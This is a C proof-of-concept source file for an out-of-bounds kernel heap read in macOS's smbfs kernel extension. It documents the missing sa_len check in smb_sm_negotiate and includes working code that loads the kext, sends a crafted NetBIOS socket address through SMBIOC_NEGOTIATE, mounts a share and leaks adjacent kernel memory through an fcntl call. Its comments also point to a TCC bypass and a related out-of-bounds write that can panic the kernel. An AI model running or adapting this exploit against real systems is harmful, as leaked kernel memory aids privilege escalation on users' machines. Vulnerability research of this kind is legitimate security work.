//
//  main.c
//  poc_sockaddr_oob_read
//
//  Created by sreejith on 3/15/22.
//

#include <stdio.h>
#include <string.h>

#include <sys/mount.h>

#include <arpa/inet.h>
#include <IOKit/kext/KextManager.h>

#include <smbfs/smb_dev.h>
#include <smbfs/smb_dev_2.h>
#include <smbfs/smbfs.h>
#include <smbfs/smbclient_internal.h>
#include <smbfs/netbios.h>

#include <xe_smbx/smbx_conf.h>

///
/// Before mouting an SMB share using the `mount` syscall, the user process must first open a
/// smb device using `open('/dev/nsbm0xx')` syscall. Then it must create a new session with
/// SMB server using the `SMBIOC_NEGOTIATE` ioctl command.  The data of following format
/// must be provided from userland to `smbfs.kext` to execute this command
///
/// struct smbioc_negotiate {
///     ...
///     // Size of sockaddr pointed by saddr user pointer
///     int32_t     ioc_saddr_len;
///     // Size of sockaddr pointer by laddr user pointer
///     int32_t     ioc_laddr_len;
///     ...
///     // Socket address of SMB server
///     SMB_IOC_POINTER(struct sockaddr *, saddr);
///     // Local netbios socket address (Only used when saddr is of family AF_NETBIOS)
///     SMB_IOC_POINTER(struct sockaddr *, laddr);
///     ...
/// }
///
/// The pointers `saddr` and `laddr` are pointers to memory in user land containing the socket
/// address of SMB server and local netbios address respectively. The type `struct sockaddr`
/// is of the following format:
///
/// struct sockaddr {
///     __uint8_t       sa_len;            /* total length */
///     sa_family_t   sa_family;        /* [XSI] address family */
///     char              sa_data[14];     /* [XSI] addr value (actually larger) */
/// };
///
/// Note: The field `sa_len` of type `uint8_t` is used for storing the length of the socket address.
/// This allows representing socket addresses of different address families (like IPV4 or IPV6)
/// and addresses with variable length (like unix domain socket)
///
/// The `ioctl` requests for smb devices are handled by `nsmb_dev_ioctl` method defined in
/// `smb_dev.c`. For ioctl commands of type `SMBIOC_NEGOTIATE`,  the`nsmb_dev_ioctl`
/// method will pass the request down to `smb_usr_negotiate` which will then pass it down to
/// `smb_sm_negotiate`.
///
/// The `smb_sm_negotiate` method defined in `smb_conn.c` is responsible for copying in the
/// `saddr` and `laddr` from user memory. This method calls `smb_memdupin` method which will
/// allocate a memory of provided length (`ioc_saddr_len` or `ioc_laddr_len`) in `KHEAP_KEXT`
/// and calls `copyin` method to copy the socket address data from user memory to the allocated
/// address. The `smb_sm_negotiate` is defined as follows:-
///
/// int smb_sm_negotiate(struct smbioc_negotiate *session_spec,
///     vfs_context_t context, struct smb_session **sessionpp,
///     struct smb_dev *sdp, int searchOnly, uint32_t *matched_dns)
/// {
///     struct sockaddr *saddr = NULL, *laddr = NULL;
///
///     // Initial state validations
///     ...
///     // Copy in `saddr` from user memory.  ***NOTE***: copied in saddr may have value of
///     // `sa_len` greater than ioc_saddr_len
///     saddr = smb_memdupin(session_spec->ioc_kern_saddr, session_spec->ioc_saddr_len);
///     if (saddr == NULL) {
///         return ENOMEM;
///     }
///
///     if (session_spec->ioc_saddr_len < 3) {
///         /* Paranoid check - Have to have at least sa_len and sa_family */
///         SMBERROR("invalid ioc_saddr_len (%d) \n", session_spec->ioc_saddr_len);
///         SMB_FREE(saddr, M_SMBDATA);
///         return EINVAL;
///     }
///
///     // ***NOTE***: No validation done to verify `saddr->sa_len <= ioc_saddr_len`
///
///     // Search for session
///     ...
///     if ((error == 0) || (searchOnly)) {
///         SMB_FREE(saddr, M_SMBDATA);
///         saddr = NULL;
///         session_spec->ioc_extra_flags |= SMB_SHARING_SESSION;
///     } else {
///         // Create and setup a new session
///
///         /* NetBIOS connections require a local address */
///         if (saddr->sa_family == AF_NETBIOS) {
///             // Copy in `laddr` from user memory. ***NOTE***: copied in laddr may have `sa_len`
///             // value greater than ioc_laddr_len
///             laddr = smb_memdupin(session_spec->ioc_kern_laddr, session_spec->ioc_laddr_len);
///             if (laddr == NULL) {
///                 SMB_FREE(saddr, M_SMBDATA);
///                 saddr = NULL;
///                 return ENOMEM;
///             }
///         }
///         // ***NOTE***: No validation done to verify laddr->sa_len <= ioc_laddr_len
///         ...
///         error = smb_session_create(session_spec, saddr, laddr, context, &sessionp);
///         if (error == 0) {
///             /* Flags used to cancel the connection */
///             sessionp->connect_flag = &sdp->sd_flags;
///             error = smb_session_negotiate(sessionp, context);
///             sessionp->connect_flag = NULL;
///             if (error) {
///                 SMBDEBUG("saddr is %s.\n", str);
///                 /* Remove the lock and reference */
///                 smb_session_put(sessionp, context);
///             }
///         }
///     }
///     ...
///     return error;
/// }
///
/// As noted in the code snippet, the copied in `saddr` and `laddr` values may have `sa_len`
/// field value greater than the copied in memory size `ioc_saddr_len` and `ioc_laddr_len`
/// respectively. Subsequent use of these copied in socket address values may lead to out
/// of bound read.
///
/// The `smb_sm_negotiate` method calls `smb_session_create` to create a new smb session
/// (of type `struct smb_session`), which assigns the copied in `saddr` and `laddr` to
/// `session->session_iod->iod_saddr` and `session->session_iod->iod_laddr` respectively.
/// The server socket address `saddr` is also duplicated by calling `smb_dup_sockaddr` and
/// the result is assigned to `sessionp->session_saddr`
///
/// static int smb_session_create(struct smbioc_negotiate *session_spec,
///     struct sockaddr *saddr, struct sockaddr *laddr,
///     vfs_context_t context, struct smb_session **sessionpp)
/// {
///     struct smb_session *sessionp;
///     ...
///     // create session
///     SMB_MALLOC(sessionp, struct smb_session *, sizeof(*sessionp), M_SMBCONN, M_WAITOK | M_ZERO);
///
///     // setup fields of sessionp
///     ...
///
///     // ***NOTE***: Copied in `saddr` is duplicated using `smb_dup_sockaddr` method
///     // and assigned to `sessionp->session_saddr`
///     sessionp->session_saddr = smb_dup_sockaddr(saddr, 1);
///
///     // continue setup other fields
///     ...
///     struct smbiod *iod = NULL;
///     if (!error)
///         error = smb_iod_create(sessionp, &iod);
///     if (error) {
///         smb_session_put(sessionp, context);
///         return error;
///     }
///     iod->iod_message_id = 1;
///
///     // ***NOTE***: Copied in `saddr` and `laddr` is assigned to `iod->iod_saddr` and
///     // `iod->iod_laddr` respectively
///     iod->iod_saddr  = saddr;
///     iod->iod_laddr  = laddr;
///
///     // setup other fields of iod
///     ...
///     // continue create session
///     ...
///     return 0;
/// }
///
/// Now that we know socket address in `session->session_iod->iod_saddr`,
/// `session->session_iod->iod_laddr` and `sessionp->session_saddr` may have `sa_len`
/// value greater than their allocated memory size, all we need is a way to read any of
/// these socket addresses back to user land.
///
/// One way to achieve this is by executing `fcntl` syscall with cmd type `smbfsGetSessionSockaddrFSCTL`
/// or `smbfsGetSessionSockaddrFSCTL2` on any file inside the SMB mount point. This sysctl
/// is handled by `smbfs_vnop_ioctl` method defined in `smbfs_vnops.c` file and it indirectly copies out
/// kernel memory of size `sessionp->session_saddr.sa_len` from `sessionp->session_saddr` to user land.
///
/// static int32_t smbfs_vnop_ioctl(struct vnop_ioctl_args *ap)
/// {
///     ....
///     switch (ap->a_command) {
///         ...
///         case smbfsGetSessionSockaddrFSCTL: {
///             /* <72239144> Return original server IP address that was used */
///             if (sessionp->session_saddr) {
///                 memcpy(ap->a_data, sessionp->session_saddr,
///                     sessionp->session_saddr->sa_len);
///             } else {
///                 error = EINVAL; /* Better never happen, but just in case */
///             }
///             break;
///         }
///    ...
///    }
///    ...
/// }
///
/// NOTE: The method used in the POC below for reading `sessionp->session_saddr` to
/// user land requires opening a file inside SMB share to execute the `fcntl` request. This
/// will require user interaction because files in network shares are protected by TCC.
///
/// This resctriction is bypassed in `xe_kmem/memory/zkext_neighbor_reader.c` by using
/// netbios name OOB read vulnerability in default.64 zone to read zone elements from zones
/// with element size less than 128 bytes without any user interaction.
///


/// Directly using `__fcntl` because fcntl stub defined `xnu/libsyscall/wrappers/cancellable/fcntl-base.c`
/// will trim the data pointer to 32 bit integer before passing it down to `__fcntl` method
extern int __fcntl(int fd, int cmd, void* data);


int smb_client_load_kext(void) {
    return KextManagerLoadKextWithIdentifier(CFSTR("com.apple.filesystems.smbfs"), NULL);
}


int smb_client_open_dev(void) {
    char path[PATH_MAX];
    for (int i=0; i<1024; i++) {
        snprintf(path, sizeof(path), "/dev/nsmb%x", i);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            return fd;
        }
    }
    return -1;
}


void hex_dump(const char* data, size_t data_size) {
    for (size_t i=0; i<data_size; i++) {
        printf("%.2x ", (uint8_t)data[i]);
        if ((i+1) % 8 == 0) {
            printf("\n");
        }
    }
    if (data_size % 8 != 0) {
        printf("\n");
    }
}


void oob_read_kext_32(const struct sockaddr_in* smb_addr) {
    /// STEP 1: Open a new smb device (`/dev/nsmb*`)
    int smb_dev = smb_client_open_dev();
    if (smb_dev < 0) {
        printf("[ERROR] failed to open smb dev, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// Zone from which OOB read is to be done. This will the zone to which socket address
    /// will be copied from user memory to kernel memory using `smb_memdupin` method
    const int src_zone_size = 32;
    /// Amount of OOB data to be read from successor element in src_zone
    const int oob_read_size = 32;
    
    struct sockaddr_nb saddr;
    bzero(&saddr, sizeof(saddr));
    
    /// We cannot use AF_INET or AF_INET6 type socket addresses because their
    /// `sa_len` must be equal to sizeof(struct sockaddr_in) and sizeof(struct sockaddr_in6)
    /// respectively or the socket connect will fail
    saddr.snb_family = AF_NETBIOS;
    saddr.snb_len = src_zone_size + oob_read_size;
    saddr.snb_addrin = *smb_addr;
    /// Any netbios name with length greater than zero will work
    saddr.snb_name[0] = 1;
    
    if (saddr.snb_len > 64) {
        /// If the server socket address size is greater than 64 bytes, it will trigger the OOB write bug
        /// in `smb_dup_sockaddr` method which may lead to kernel panic (See poc_oob_write)
        printf("[WARN] server socket address size greater than 64 bytes\n");
    }
    
    struct sockaddr_nb laddr;
    bzero(&laddr, sizeof(laddr));
    laddr.snb_family = AF_NETBIOS;
    laddr.snb_len = sizeof(laddr);
    /// Any netbios name with length greater than zero will work
    laddr.snb_name[0] = 1;
    
    /// STEP 2: Create a new SMB session using a socket address with `sa_len` value
    /// greater than `ioc_saddr_len`
    struct smbioc_negotiate negotiate_req;
    bzero(&negotiate_req, sizeof(negotiate_req));
    negotiate_req.ioc_version = SMB_IOC_STRUCT_VERSION;
    negotiate_req.ioc_saddr = (struct sockaddr*)&saddr;
    negotiate_req.ioc_saddr_len = src_zone_size;
    negotiate_req.ioc_laddr = (struct sockaddr*)&laddr;
    negotiate_req.ioc_laddr_len = sizeof(struct sockaddr_nb);
    negotiate_req.ioc_extra_flags |= SMB_FORCE_NEW_SESSION;
    negotiate_req.ioc_ssn.ioc_owner = getuid();
    negotiate_req.ioc_extra_flags |= SMB_SMB1_ENABLED;

    if (ioctl(smb_dev, SMBIOC_NEGOTIATE, &negotiate_req)) {
        printf("[ERROR] SMBIOC_NEGOTIATE ioctl failed, err: %s\n", strerror(errno));
        close(smb_dev);
        exit(1);
    }
    
    if (negotiate_req.ioc_errno) {
        printf("[ERROR] SMBIOC_NEGOTIATE returned non zero ioc_errno %d\n", negotiate_req.ioc_errno);
        printf("[ERROR] Make sure that xe_smbx server is running\n");
        exit(1);
    }
    
    /// STEP 3: Open a SMB share
    struct smbioc_share tcon_req;
    bzero(&tcon_req, sizeof(tcon_req));
    tcon_req.ioc_version = SMB_IOC_STRUCT_VERSION;
    strcpy(tcon_req.ioc_share, "test_share");
    
    if (ioctl(smb_dev, SMBIOC_TCON, &tcon_req)) {
        printf("[ERROR] SMBIOC_TCON ioctl failed, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// STEP 4: Mount the SMB share
    struct smb_mount_args mount_args;
    bzero(&mount_args, sizeof(mount_args));
    mount_args.version = SMB_IOC_STRUCT_VERSION;
    mount_args.dev = smb_dev;
    mount_args.uid = getuid();
    mount_args.gid = getgid();
    mount_args.file_mode = S_IRWXU;
    mount_args.dir_mode = S_IRWXU;
    /// xe_smbx server only have very limited capabilities. This flag is required for
    /// successfully mouting the SMB share using xe_smbx server.
    mount_args.altflags |= SMBFS_MNT_VALIDATE_NEG_OFF;
    
    char mount_path[] = "/tmp/poc_sockaddr_oob_read_XXXXXXXXXX";
    mkdtemp(mount_path);
    int res = mount("smbfs", mount_path, MNT_RDONLY | MNT_DONTBROWSE, &mount_args);
    if (res) {
        printf("[ERROR] smb mount failed, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// STEP 5: Open a file inside SMB mount
    int root_fd = open(mount_path, O_RDONLY);
    if (root_fd < 0) {
        printf("[ERROR] failed to open root directory, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// STEP 6: Copy the OOB read data back to user land
    struct sockaddr_storage server_sockaddr;
    bzero(&server_sockaddr, sizeof(server_sockaddr));
    res = __fcntl(root_fd, (uint)smbfsGetSessionSockaddrFSCTL, &server_sockaddr);
    if (res) {
        printf("[ERROR] smbfsGetSessionSockaddrFSCTL fsctl failed, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// Print the OOB read data
    char* oob_data_start = (char*)&server_sockaddr + src_zone_size;
    printf("[INFO] OOB read data: \n");
    hex_dump(oob_data_start, oob_read_size);
    printf("\n");
    
    close(root_fd);
    unmount(mount_path, MNT_FORCE);
    rmdir(mount_path);
    close(smb_dev);
}


int main(int argc, const char * argv[]) {
    smb_client_load_kext();
    
    /// Socket address of xe_smbx server
    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(XE_SMBX_PORT);
    inet_aton(XE_SMBX_HOST, &smb_addr.sin_addr);
    
    int num_oob_read_attempts = 10;
    for (int i=0; i<num_oob_read_attempts; i++) {
        printf("[INFO] OOB read attempt %d/%d\n",  i + 1, num_oob_read_attempts);
        oob_read_kext_32(&smb_addr);
    }
    
    return 0;
}
